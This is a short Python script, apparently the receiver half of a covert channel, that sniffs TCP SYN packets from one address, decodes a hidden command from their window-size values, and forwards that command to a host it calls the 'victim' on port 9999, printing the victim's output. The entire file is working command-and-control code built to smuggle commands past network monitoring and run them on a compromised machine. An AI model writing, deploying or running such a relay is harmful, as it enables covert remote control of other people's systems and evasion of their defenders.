from scapy.all import sniff, TCP, IP
import socket
import time

def decode_window_sizes_to_command(window_sizes):
    return ''.join(chr(ws - 1000) for ws in window_sizes)

def send_command_to_victim(command, victim_ip='178.10.0.3', victim_port=9999):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((victim_ip, victim_port))
            s.sendall(command.encode())
            data = s.recv(8192)
            return data.decode(errors='ignore')
    except Exception as e:
        return f"[!] Error connecting to victim: {e}"

captured_windows = []

def packet_callback(pkt):
    if pkt.haslayer(TCP):
        tcp = pkt.getlayer(TCP)
        ip = pkt.getlayer(IP)
        if tcp.flags == 'S' and ip.src == "178.10.0.1":
            window_size = tcp.window
            captured_windows.append(window_size)
            log_line = f"[+] Captured window size: {window_size}"
            print(log_line)

            with open("recv_tcp.py.log", "a") as f:
                f.write(log_line + "\n")

def main():
    print("[*] Sniffing TCP SYN packets from sender (178.10.0.1)...")
    

    open("recv_tcp.py.log", "w").close()
    
    sniff(filter="tcp and tcp[tcpflags] & tcp-syn != 0", prn=packet_callback, count=20)
    
    if not captured_windows:
        print("[-] No window sizes captured.")
        return

    print("[*] Decoding command from captured window sizes...")
    command = decode_window_sizes_to_command(captured_windows)
    print(f"[+] Decoded command:\n{command}")
    print("[*] Sending command to victim...")
    output = send_command_to_victim(command)
    print(f"[+] Victim output:\n{output}")

if __name__ == "__main__":
    main()
